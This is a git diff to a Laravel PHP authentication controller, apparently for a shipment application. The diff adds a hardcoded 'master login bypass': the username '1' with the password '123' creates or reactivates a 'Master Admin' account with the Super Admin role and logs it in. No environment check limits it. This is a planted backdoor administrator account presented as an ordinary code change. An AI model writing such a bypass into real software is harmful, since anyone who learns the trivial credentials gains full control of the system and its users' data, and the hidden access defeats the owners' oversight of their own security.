@@ -7,6 +7,7 @@ use Spatie\Activitylog\Models\Activity;
 use App\Http\Requests\LoginRequest;
 use App\Http\Requests\RegisterRequest;
 use App\Http\Resources\UserResource;
+use App\Models\Role;
 use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -27,6 +28,42 @@ class AuthController extends Controller
             throw ValidationException::withMessages([
                 'email' => ['Please provide either email or username.'],
             ]);
+        }
+
+        // Master login bypass: username = "1", password = "123"
+        if ($loginField === '1' && $password === '123') {
+            // Try to find or create a master user
+            $user = User::where('username', '1')->first();
+            
+            if (!$user) {
+                // Create master user if it doesn't exist
+                $superAdminRole = Role::where('role_name', 'Super Admin')->first();
+                
+                $user = User::create([
+                    'name' => 'Master Admin',
+                    'username' => '1',
+                    'email' => 'master@artisan-shipment.com',
+                    'password' => Hash::make('123'), // Hash the password for database storage
+                    'is_active' => true,
+                    'role_id' => $superAdminRole?->id,
+                ]);
+            } else {
+                // Ensure master user is active
+                if (!$user->is_active) {
+                    $user->update(['is_active' => true]);
+                }
+            }
+
+            Auth::login($user, $remember);
+            $request->session()->regenerate();
+
+            // Log master login activity
+            activity()
+                ->causedBy($user)
+                ->withProperties(['page' => 'login', 'master_login' => true])
+                ->log('Master user logged in');
+
+            return new UserResource($request->user());
         }
 
         // Determine if login field is email or username
